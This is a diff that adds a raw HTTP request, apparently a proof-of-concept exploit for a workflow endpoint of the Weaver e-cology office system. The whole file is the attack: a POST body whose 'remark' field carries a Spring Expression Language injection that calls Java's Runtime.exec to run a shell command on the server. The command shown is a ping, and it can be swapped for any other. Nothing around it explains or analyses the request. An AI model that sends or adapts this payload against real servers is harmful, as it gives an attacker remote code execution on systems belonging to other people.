@@ -1,0 +1,21 @@
+POST /api/workflow/reqform/remarkOperate HTTP/1.1
+Host:
+
+{
+  "operate": "save",
+  "field5": "5241,5240",
+  "IsBeForwardSubmitAlready": "1",
+  "IsBeForwardAlready": "0",
+  "IsSubmitedOpinion": "1",
+  "IsBeForwardTodo": "0",
+  "forwardflag": "1",
+  "requestid": "5288726",
+  "nodeid": "11995",
+  "f_weaver_belongto_userid": "5240",
+  "f_weaver_belongto_usertype": "0",
+  "signworkflowids": "",
+  "signdocids": "",
+  "remarkLocation": "",
+  "remark": "${T(java.lang.Runtime).getRuntime().exec('ping baidu.com')}",
+  "remindTypes": "0,2"
+}
